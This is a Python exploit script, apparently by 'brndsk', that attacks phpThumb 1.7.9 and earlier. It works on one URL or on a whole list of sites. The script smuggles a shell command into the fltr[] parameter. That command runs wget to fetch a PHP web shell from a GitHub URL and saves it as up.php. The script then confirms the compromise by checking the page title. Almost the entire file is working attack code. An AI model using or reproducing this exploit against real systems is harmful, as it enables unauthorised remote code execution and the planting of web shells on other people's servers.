try:
	import requests as r
except:
	print(" \nInstall requests lib")
	exit()
try:
	from bs4 import BeautifulSoup
except:
	print(" \nInstall BeautifulSoup4 lib")
	exit()
import argparse, os, sys
os.system("cls || clear")
banner = """

 /$$
| $$
| $$       /$$   /$$ /$$$$$$$   /$$$$$$
| $$      | $$  | $$| $$__  $$ |____  $$
| $$      | $$  | $$| $$  \ $$  /$$$$$$$
| $$      | $$  | $$| $$  | $$ /$$__  $$
| $$$$$$$$|  $$$$$$/| $$  | $$|  $$$$$$$
|________/ \______/ |__/  |__/ \_______/  {2.0#stable}

► phpThumb version <= 1.7.9 (RCE)
► Automatic file upload
► Coded 4Study by: Brndsk
► Github: github.com/brndsk

► Use: xpl.py --url http:/vuln.com/phpThumb/
► Use: xpl.py --list list.txt
"""
print(banner)
parser = argparse.ArgumentParser()
parser.add_argument("--url", action="store", help='To exploit one website\n')
parser.add_argument("--list", action="store", help='To exploit list of websites')
argument = parser.parse_args()
shelltxt = "https://raw.githubusercontent.com/brndsk/luna/master/shell.txt"
up = f"phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg;wget {shelltxt} -O up.php;&phpThumbDebug=9"
uploaded = 'up.php'
def func_url():
	site = sys.argv[2]
	try:
		uploading = r.get(site+up)
		exploited = r.get(site+uploaded)
		soup = BeautifulSoup(exploited.text, 'html.parser')
		if uploading.status_code == 200:
			if exploited.status_code == 200:

				if soup.title.text == "brndsk":
					print(f' \n[+] ► Check!: {site+uploaded}\n')
				else:
					print(f" \n [-] Not vulnerable: {site}\n")
			else:
				print(f" \n [-] Not vulnerable: {site}\n")
		else:
			print(f" \n [-] Not vulnerable: {site}\n")
	except:
		print(f" \n [-] Not vulnerable: {site}\n")


if argument.url:
	func_url()
def func_list():
	txt = sys.argv[2]
	read_file = open(txt, 'r', encoding='utf-8', errors='ignore').readlines()
	read = open('list.txt', 'r')

	for lista in read:

		try:
			a = lista.rstrip('\n')
			b = up.rstrip('\n')
			c = uploaded.rstrip('\n')
			site = a+b
			site = site.strip('\n')
			upload = r.get(site)
			exploited = a+c
			exploited_r = r.get(exploited)
			if exploited_r.status_code == 200:
				soup = BeautifulSoup(exploited_r.text, 'html.parser')

				if soup.title.text == "brndsk":
					print(f" \n[+] ► Check!: {exploited}\n")
				else:
					print(f"[-] Not Vulnerable: {lista}")
			else:
				print(f"[-] Not Vulnerable: {lista}")
		except:
			print(f"[-] Not Vulnerable: {lista}")


if argument.list:
	func_list()
